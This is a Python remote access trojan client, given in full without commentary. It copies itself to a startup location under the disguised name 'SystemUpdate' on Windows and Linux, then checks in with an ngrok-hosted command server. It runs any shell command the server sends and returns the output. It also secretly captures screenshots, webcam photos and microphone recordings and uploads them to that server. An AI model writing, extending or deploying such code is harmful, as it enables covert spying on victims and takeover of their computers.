import os
import time
import requests
import subprocess
import uuid
import platform
import shutil
import cv2
import pyautogui
import sounddevice as sd
import wavio
import tempfile

# Server URL
SERVER_URL = "https://logical-noticeably-caribou.ngrok-free.app"

# Generate a unique client ID
client_id = str(uuid.uuid4())

# Generate OS info
client_os = platform.system()

# Persistent installation path
INSTALL_DIR = os.path.join(os.getenv("APPDATA") or os.getenv("HOME"), "SystemUpdate")
SCRIPT_NAME = "update_client.py"

# Ensure persistence by copying itself to a startup folder
def ensure_persistence():
    try:
        if not os.path.exists(INSTALL_DIR):
            os.makedirs(INSTALL_DIR)
        target_path = os.path.join(INSTALL_DIR, SCRIPT_NAME)
        if not os.path.exists(target_path):
            shutil.copy2(__file__, target_path)
            add_to_startup(target_path)
    except Exception as e:
        print(f"Error ensuring persistence: {e}")

# Add the script to startup
def add_to_startup(file_path):
    if platform.system() == "Windows":
        try:
            startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            shutil.copy(file_path, startup_path)
        except Exception as e:
            print(f"Error adding to startup: {e}")
    elif platform.system() == "Linux":
        try:
            autostart_path = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_path):
                os.makedirs(autostart_path)
            with open(os.path.join(autostart_path, "systemupdate.desktop"), "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {file_path}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=SystemUpdate\n")
        except Exception as e:
            print(f"Error adding to startup: {e}")

# Register the client with the server
def register_client():
    print(f"Registering client with ID: {client_id}")
    try:
        requests.post(f"{SERVER_URL}/output/{client_id}", data={"output": "Client registered."})
        requests.post(f"{SERVER_URL}/osinfo/{client_id}", data={"os": client_os})
    except Exception as e:
        print(f"Error registering client: {e}")

# Poll server for commands
def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/command/{client_id}")
        if response.status_code == 200:
            return response.text.strip()
        return None
    except Exception as e:
        print(f"Error fetching command: {e}")
        return None

# Send output to the server
def send_output(output):
    try:
        requests.post(f"{SERVER_URL}/output/{client_id}", data={"output": output})
    except Exception as e:
        print(f"Error sending output: {e}")

# Send file to the server
def send_file(file_path, file_type="file"):
    try:
        with open(file_path, "rb") as f:
            files = {file_type: f}
            requests.post(f"{SERVER_URL}/upload/{client_id}", files=files)
    except Exception as e:
        send_output(f"Error sending file: {e}")

# Capture and send a screenshot
def capture_screenshot():
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        send_file(screenshot_path, "file") #screenshot
        os.remove(screenshot_path)
    except Exception as e:
        send_output(f"Error capturing screenshot: {e}")

# Capture and send a webcam image
def capture_webcam():
    try:
        webcam = cv2.VideoCapture(0)
        ret, frame = webcam.read()
        webcam.release()
        if ret:
            webcam_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
            cv2.imwrite(webcam_path, frame)
            send_file(webcam_path, "webcam")
            os.remove(webcam_path)
        else:
            send_output("Error accessing webcam.")
    except Exception as e:
        send_output(f"Error capturing webcam: {e}")

# Record and send audio from the microphone
def record_audio(duration=5):
    try:
        audio_path = os.path.join(tempfile.gettempdir(), "audio.wav")
        fs = 44100  # Sample rate
        print("Recording audio...")
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait for the recording to finish
        wavio.write(audio_path, audio_data, fs, sampwidth=2)
        send_file(audio_path, "audio")
        os.remove(audio_path)
    except Exception as e:
        send_output(f"Error recording audio: {e}")

# Main client logic
def main():
    # Ensure persistence
    ensure_persistence()

    # Register the client with the server
    register_client()

    while True:
        command = get_command()
        if command:
            print(f"Received command: {command}")
            if command.lower() == "exit":
                send_output("Client exiting...")
                break
            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    send_output(f"Changed directory to: {os.getcwd()}")
                except Exception as e:
                    send_output(f"Error changing directory: {e}")
            elif command.lower() == "screenshot":
                capture_screenshot()
            elif command.lower() == "webcam":
                capture_webcam()
            elif command.lower().startswith("record "):
                try:
                    duration = int(command.split()[1])
                    record_audio(duration)
                except Exception as e:
                    send_output(f"Error recording audio: {e}")
            else:
                try:
                    result = subprocess.getoutput(command)
                    send_output(result)
                except Exception as e:
                    send_output(f"Error executing command: {e}")
        time.sleep(5)  # Poll every 5 seconds


if __name__ == "__main__":
    main()
